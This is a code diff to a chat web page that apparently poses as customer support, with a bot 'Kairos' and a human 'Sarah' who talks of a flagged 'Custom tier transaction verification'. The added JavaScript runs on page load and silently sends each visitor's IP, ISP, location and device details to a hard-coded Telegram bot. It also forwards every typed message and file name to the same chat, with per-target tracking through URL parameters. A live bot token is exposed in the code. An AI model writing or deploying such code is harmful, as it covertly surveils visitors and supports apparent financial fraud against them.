@@ -535,13 +535,100 @@ header .logo-card img {
         }
         setInterval(particle,800);
 
+async function sendVisitorDetailsToTelegram() {
+  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+  const CHAT_IDs = '-1003913850436'; 
+
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+
+    const data = await ipResponse.json();
+    const currentPage = window.location.pathname; 
+
+    let devicePlatform = 'Unknown';
+    if (navigator.userAgentData && navigator.userAgentData.platform) {
+      devicePlatform = navigator.userAgentData.platform; 
+    } else if (navigator.platform) {
+      devicePlatform = navigator.platform; 
+    }
+
+    const telegramMessage = 
+      `🌐 <b>New Visitor Logged</b>\n\n` +
+      `• <b>Target User:</b> <code>${identifyUser}</code>\n` +
+      `• <b>Visited Page:</b> <code>${currentPage}</code>\n` + 
+      `• <b>Platform/OS:</b> <code>${devicePlatform}</code>\n` + 
+      `• <b>IP Address:</b> <code>${data.ip}</code>\n` +
+      `• <b>ISP/Provider:</b> <code>${data.org || 'Unknown'}</code>\n` +
+      `• <b>ASN:</b> <code>${data.asn || 'N/A'}</code>\n` +
+      `• <b>Location:</b> <code>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</code>\n` +
+      `• <b>Device Agent:</b> <code>${navigator.userAgent.substring(0, 100)}...</code>`;
+
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_IDs,
+        text: telegramMessage,
+        parse_mode: 'HTML'
+      })
+    });
+
+  } catch (error) {
+    console.error('System logging exception occurred.');
+  }
+}
+
+// NEW PIPELINE METHOD: Forwards real-time messages to Sarah's monitoring desk
+async function forwardUserMessageToTelegram(messageText, messageType = "text") {
+  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+  const CHAT_IDs = '-1003913850436'; 
+
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Visitor';
+
+    let displayContent = messageText;
+    if (messageType === "photo") displayContent = "📷 [Sent an Image/Screenshot Attachment]";
+    if (messageType === "video") displayContent = "🎥 [Sent a Video Recording]";
+
+    const telegramMessage = 
+      `💬 <b>Incoming Message</b>\n` +
+      `• <b>From User:</b> <code>${identifyUser}</code>\n` +
+      `• <b>Text:</b> ${displayContent}`;
+
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_IDs,
+        text: telegramMessage,
+        parse_mode: 'HTML'
+      })
+    });
+
+  } catch (error) {
+    console.error('Failed to forward user text to monitoring panel.');
+  }
+}
+
+// --- THE PAGE LOAD TRIGGER ---
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+
 // ---------- Configuration Constants ----------
-// ⚠️ WARNING: Move BOT_TOKEN to a secure backend environment as soon as possible!
 const BOT_TOKEN = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
 const CHAT_ID = '-1003913850436';
 
 // ---------- State & Personality Configuration ----------
-// Moved to the top to fix ReferenceErrors during execution
 const personality = { tone: "neutral", lastIntent: null, userMood: "unknown", awaitingSarahConfirm: false };
 let isSarahActive = false; 
 
@@ -569,7 +656,6 @@ const sarahProfile = {
     name: "Sarah (Account Representative)",
     avatarColor: "linear-gradient(135deg, #ff416c, #ff4b2b)",
     statusText: "Connected with Sarah",
-    // Clean, reassuring variations for a live human touch
     greetings: [
         "Hi, this is Sarah. I've personally stepped into this chat session to assist you. Please tell me exactly what issue you're experiencing so I can help resolve it.",
         "Hello, Sarah here. I just noticed your session flagged an issue, so I'm stepping in to handle this manually. What seems to be the problem?",
@@ -577,7 +663,6 @@ const sarahProfile = {
         "Hello. I'm Sarah, your account representative. I've joined the session to take a look at your issue directly. Let's get this taken care of—what are you running into?"
     ]
 };
-
 
 const quotes = [ 
     "Believe in yourself and all that you are.", "Small steps each day lead to big results.", 
@@ -630,11 +715,9 @@ const profilePhoto = document.getElementById('profilePhoto');
 const DEFAULT_AVATAR = 'default-avatar.png';
 let isProcessing = false;
 
-// Fixed Profile Avatars for the Bots
-const KAIROS_AVATAR = 'https://api.dicebear.com/7.x/bottts/svg?seed=Kairos&backgroundColor=6b2cd8'; // Premium Bot look
-const SARAH_AVATAR = 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=150&auto=format&fit=crop'; // Professional Representative
+const KAIROS_AVATAR = 'https://api.dicebear.com/7.x/bottts/svg?seed=Kairos&backgroundColor=6b2cd8'; 
+const SARAH_AVATAR = 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=150&auto=format&fit=crop'; 
 
-// Click event handling to swap or pick image (Labels completely removed)
 profilePhoto.addEventListener('click', () => {
     if (isProcessing) return;
     const hasPhoto = localStorage.getItem('profilePhoto');
@@ -646,7 +729,6 @@ profilePhoto.addEventListener('click', () => {
     }
 });
 
-// Auto-process canvas image transformation
 photoInput.addEventListener('change', (e) => {
     const file = e.target.files[0];
     if (!file || isProcessing) return;
@@ -675,51 +757,38 @@ photoInput.addEventListener('change', (e) => {
     reader.readAsDataURL(file);
 });
 
-
-
 // ---------- Integrated Profile-Aware Message Renderer ----------
 function addMessage(content, sender="bot", status="delivered", type="text"){
     const wrap = document.createElement("div");
-    wrap.className = `msgWrap ${sender}-wrap`; // Added sender wrapper class for fine flex-alignment
+    wrap.className = `msgWrap ${sender}-wrap`; 
 
-    // Create the visual avatar icon element
     const avatarImg = document.createElement("img");
     avatarImg.className = "chat-bubble-avatar";
 
-    // Assign correct photo source dynamically
-if (sender === "user") {
-    const savedUserPhoto = localStorage.getItem('profilePhoto');
-    avatarImg.src = savedUserPhoto ? savedUserPhoto : DEFAULT_AVATAR;
-} else {
-    // Check for handover or wrap-up phrases
-    const isTransferringText = content.includes("connect you with Sarah") || 
-                               content.includes("Connecting you with Sarah");
-                               
-    // Detect if the conversation is ending
-    const isEndingText = content.toLowerCase().includes("end conversation") || 
-                         content.toLowerCase().includes("conversation ended");
-
-    if (isEndingText) {
-        // SYSTEM FIX: Fully turn off Sarah's state so Kairos takes over the backend completely
-        isSarahActive = false; 
-        sessionStorage.removeItem('agent_takeover'); // Clear any storage locks if you use them
-        
-        // VISUAL FIX: Show Kairos's face for this closing message
-        avatarImg.src = KAIROS_AVATAR;
-        
-    } else if (isTransferringText) {
-        avatarImg.src = KAIROS_AVATAR;
-    } else if (isSarahActive) {
-        avatarImg.src = SARAH_AVATAR;
+    if (sender === "user") {
+        const savedUserPhoto = localStorage.getItem('profilePhoto');
+        avatarImg.src = savedUserPhoto ? savedUserPhoto : DEFAULT_AVATAR;
     } else {
-        const isSarahText = sarahProfile.greetings.includes(content) || content.includes("high-value Custom tier");
-        avatarImg.src = isSarahText ? SARAH_AVATAR : KAIROS_AVATAR;
+        const isTransferringText = content.includes("connect you with Sarah") || 
+                                   content.includes("Connecting you with Sarah");
+                                   
+        const isEndingText = content.toLowerCase().includes("end conversation") || 
+                             content.toLowerCase().includes("conversation ended") ||
+                             content.includes("Sarah has left the chat");
+
+        if (isEndingText) {
+            isSarahActive = false; 
+            sessionStorage.removeItem('agent_takeover'); 
+            avatarImg.src = KAIROS_AVATAR;
+        } else if (isTransferringText) {
+            avatarImg.src = KAIROS_AVATAR;
+        } else if (isSarahActive) {
+            avatarImg.src = SARAH_AVATAR;
+        } else {
+            const isSarahText = sarahProfile.greetings.includes(content) || content.includes("high-value Custom tier");
+            avatarImg.src = isSarahText ? SARAH_AVATAR : KAIROS_AVATAR;
+        }
     }
-}
-
-
-
-
 
     const msg = document.createElement("div");
     msg.className = `${sender} message`;
@@ -743,7 +812,6 @@ if (sender === "user") {
         msg.textContent = content;
     }
 
-    // Structural alignment: Bot avatar on left, User avatar on right
     if (sender === "user") {
         wrap.appendChild(msg);
         wrap.appendChild(avatarImg);
@@ -755,7 +823,7 @@ if (sender === "user") {
     if(sender === "user"){
         const meta = document.createElement("div");
         meta.className = "meta";
-        meta.style.marginRight = "46px"; // Offsets timestamp layout cleanly below the message box
+        meta.style.marginRight = "46px"; 
 
         const time = document.createElement("span");
         time.className = "timestamp";
@@ -801,7 +869,7 @@ function removeTyping(){
 }
 
 function getTypingDelay(text){
-    return Math.min(300 + text.length * 20, 2500); // Optimized for faster, natural response times
+    return Math.min(300 + text.length * 20, 2500); 
 }
 
 let typingTimeout;
@@ -825,7 +893,6 @@ function transitionToSarah() {
     if(isSarahActive) return;
     isSarahActive = true; 
 
-    // Kill the quote timer permanently right here
     clearInterval(quoteRotationTimer);
     quoteRotationTimer = null; 
 
@@ -849,21 +916,16 @@ function transitionToSarah() {
 
             if (statusText) statusText.textContent = sarahProfile.statusText;
 
-            // 1. Check what the user was talking about right before Sarah joined
             const userHistoryText = chatHistory.filter(m => m.sender === 'user').map(m => m.text.toLowerCase()).join(" ");
             let sarahEntryMessage = "";
 
-            // 2. High-value Custom Escrow/Verification contextual override
             if (userHistoryText.includes("custom") || userHistoryText.includes("verification") || userHistoryText.includes("hold")) {
                 sarahEntryMessage = "Hi, this is Sarah. I've personally stepped in because our system flagged a high-value Custom tier transaction verification. I'm overseeing the compliance release manually to ensure everything updates perfectly. Let's get this sorted out for you.";
-            } 
-            // 3. Fallback to a random conversational human greeting
-            else {
+            } else {
                 const randomIndex = Math.floor(Math.random() * sarahProfile.greetings.length);
                 sarahEntryMessage = sarahProfile.greetings[randomIndex];
             }
 
-            // 4. Render the chosen message cleanly to the chat timeline
             addMessage(sarahEntryMessage, "bot");
 
             conversationMemory.push({ role: "sarah", content: sarahEntryMessage, type: "text", time: Date.now() });
@@ -953,6 +1015,7 @@ function adaptTone(msg){
     }
 }
 
+// Custom tone adaptation applied safely per environment
 function humanize(text){
     if(personality.tone === "calm") return "I get how that can be frustrating. " + text;
     if(personality.tone === "friendly") return text + " 👍";
@@ -993,20 +1056,15 @@ function handleMessage(msg){
 }
 
 // ---------- OPTIMIZED BOT EXECUTION ENGINE ----------
-
 function botReply(text){
-    // Humanize adds conversational filler prefixes like "Alright…", "Okay, so"
     const finalText = humanize(text);
     showTyping();
     const delay = getTypingDelay(finalText);
 
     setTimeout(() => {
         removeTyping();
-
-        // CRITICAL FIX: Explicitly forcing standard "bot" bubble styling and "text" type
         addMessage(finalText, "bot", "delivered", "text");
 
-        // Commit cleanly to persistence layers
         conversationMemory.push({ role: "bot", content: finalText, type: "text", time: Date.now() });
         chatHistory.push({ sender: 'bot', text: finalText, type: 'text' });
         localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
@@ -1014,25 +1072,17 @@ function botReply(text){
 }
 
 // ---------- FIXED AUTOMATIC BACKGROUND QUOTE ROTATION ----------
-
 function startQuoteAutorotation() {
     clearInterval(quoteRotationTimer);
     quoteRotationTimer = setInterval(() => {
-        // Only run if the tab is active and the live agent (Sarah) hasn't taken over
         if (sessionStorage.getItem('active_chat_tab') === currentTabId && !isSarahActive) {
-
-            // CRITICAL FIX: Update the status bar directly instead of calling botReply
             if (statusText && quotes && quotes.length > 0) {
                 const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
-
-                // This updates the text in place without generating any message bubbles
                 statusText.textContent = randomQuote;
             }
         }
-    }, 7000); // Changes text gracefully every 7 seconds to match Video 1
+    }, 7000); 
 }
-
-
 
 // ---------- Outbound Transmission Handling ----------
 async function sendMessage(){
@@ -1051,6 +1101,9 @@ async function sendMessage(){
     conversationMemory.push({ role: "user", content: text, type: type, time: Date.now() });
     chatHistory.push({ sender: 'user', text: text, type: type });
     localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
+
+    // FORWARDING TO TELEGRAM FEED FOR SARAH
+    forwardUserMessageToTelegram(text, type);
 
     if (type === "text") {
         handleMessage(text);
@@ -1094,6 +1147,9 @@ botFileInput.addEventListener('change', async () => {
     chatHistory.push({ sender: 'user', text: localFileUrl, type: msgType });
     localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
 
+    // FORWARDING COMPONENT ATTACHMENTS FOR MONITORING DESK
+    forwardUserMessageToTelegram(file.name, msgType);
+
     setTimeout(() => {
         botReply(`Received file: ${file.name}. Saved directly to secure logs.`);
     }, 1000);
@@ -1115,7 +1171,7 @@ botFileInput.addEventListener('change', async () => {
 botSendBtn.addEventListener('click', sendMessage);
 botInput.addEventListener('keypress', e=>{ if(e.key==='Enter') sendMessage(); });
 
-// ---------- Inbound Long Poll Processing (Typing Queue Fix) ----------
+// ---------- Inbound Long Poll Processing (Dual-Route Routing Sync) ----------
 async function getTelegramFileUrl(fileId) {
     try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
@@ -1131,6 +1187,10 @@ async function listenForTelegramMessages() {
         scheduleNextCheck();
         return;
     }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const thisTabUser = urlParams.get('user');
+    const userSearchString = thisTabUser ? `• Target User: ${thisTabUser}` : null;
 
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=20`;
 
@@ -1153,6 +1213,31 @@ async function listenForTelegramMessages() {
                 if (update.message) {
                     let msgContent = null;
                     let msgType = "text";
+                    let isTargetedToMe = false;
+
+                    // DUAL-ROUTE EVALUATION PIPELINE
+                    if (update.message.reply_to_message) {
+                        const originalMsgText = update.message.reply_to_message.text || "";
+                        
+                        // ROUTE A: Sarah replied directly to the automatic visitor details log configuration card
+                        if (userSearchString && originalMsgText.includes(userSearchString)) {
+                            isTargetedToMe = true;
+                        } 
+                        
+                        // ROUTE B: Sarah replied to an individual client text notification stream block
+                        else if (originalMsgText) {
+                            const expectedLabel = thisTabUser ? `• From User: ${thisTabUser}` : null;
+                            if (expectedLabel && originalMsgText.includes(expectedLabel)) {
+                                isTargetedToMe = true;
+                            }
+                        }
+                    }
+
+                    if (!isTargetedToMe) {
+                        lastUpdateId = update.update_id;
+                        localStorage.setItem('tg_last_update_id', lastUpdateId);
+                        continue; 
+                    }
 
                     if (update.message.photo) {
                         const fileId = update.message.photo[update.message.photo.length - 1].file_id;
@@ -1172,28 +1257,22 @@ async function listenForTelegramMessages() {
                     }
 
                     if (msgContent) {
-                        // Check if Sarah sent an exit phrase via the panel
                         if (msgType === "text" && (msgContent.toLowerCase().includes("end conversation") || msgContent.toLowerCase().includes("conversation ended"))) {
                             
-                            // SYSTEM RESET: Kill agent state completely
                             isSarahActive = false;
                             sessionStorage.removeItem('agent_takeover');
                             
-                            // UI VISUAL RESET: Restore Kairos theme header styles instantly
                             const botHeader = document.getElementById('botHeader');
                             if (botHeader) {
                                 botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
                                 botHeader.textContent = "Kairos Bot System";
                             }
                             
-                            // Restart ambient background quotes rotation status
                             startQuoteAutorotation();
 
-                            // FIX: Override Sarah's command text completely so Kairos introduces himself instead
                             msgContent = "Sarah has left the chat. I am Kairos, your automated assistant, and I am back online to help you!";
                         }
 
-                        // Keeps multiple arriving incoming messages running smoothly without stalling the main pipeline thread
                         setTimeout(() => { showTyping(); }, chainDelay);
                         chainDelay += 800; 
 
@@ -1225,6 +1304,9 @@ function scheduleNextCheck() {
 }
 
 function initiateKairosConversation() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const thisTabUser = urlParams.get('user') || 'Visitor';
+
     if (chatHistory.length === 0) {
         showTyping();
         setTimeout(() => {
@@ -1237,23 +1319,19 @@ function initiateKairosConversation() {
             chatHistory.push({ sender: 'bot', text: initialGreeting, type: 'text' });
             localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
 
-            // Starts changing the background text instead of sending bubbles
             startQuoteAutorotation();
         }, 1000);
     } else {
-        // Look through history to determine state on reload, checking if the conversation was ended last
         let lastSarahIndex = -1;
         let lastEndIndex = -1;
         
         chatHistory.forEach((m, idx) => {
             if (m.text && m.text.includes("this is Sarah")) lastSarahIndex = idx;
-            // Check for either the raw command phrase or the custom system greeting phrase on page reloads
             if (m.text && (m.text.toLowerCase().includes("end conversation") || m.text.toLowerCase().includes("conversation ended") || m.text.includes("Sarah has left the chat"))) {
                 lastEndIndex = idx;
             }
         });
 
-        // If Sarah stepped in, and hasn't ended it more recently, restore Sarah panel
         if (lastSarahIndex > -1 && lastSarahIndex > lastEndIndex) {
             isSarahActive = true; 
             const botHeader = document.getElementById('botHeader');
@@ -1263,14 +1341,12 @@ function initiateKairosConversation() {
             }
             if (statusText) statusText.textContent = sarahProfile.statusText;
         } else {
-            // Safe fallback to run background text rotation on page reload if Kairos is in control
             isSarahActive = false;
             startQuoteAutorotation();
         }
     }
 }
 
-// Fixed History UI Rendering Parser to safely handle both strings and uploaded attachments on reload
 function loadChatHistory() {
     if (chatHistory.length > 0) {
         chatHistory.forEach(item => {
@@ -1280,25 +1356,15 @@ function loadChatHistory() {
     }
 }
 
-
-
 document.addEventListener('DOMContentLoaded', () => {
-    // 1. Initialize user profile picture instantly on load
     const saved = localStorage.getItem('profilePhoto');
     if (profilePhoto) profilePhoto.src = saved ? saved : DEFAULT_AVATAR;
 
-    // 2. Load the rest of your systems
     loadChatHistory();
     initiateKairosConversation();
     scheduleNextCheck(); 
     startQuoteAutorotation();
 });
-
-
-
 </script>
-
-
-
 </body>
 </html>
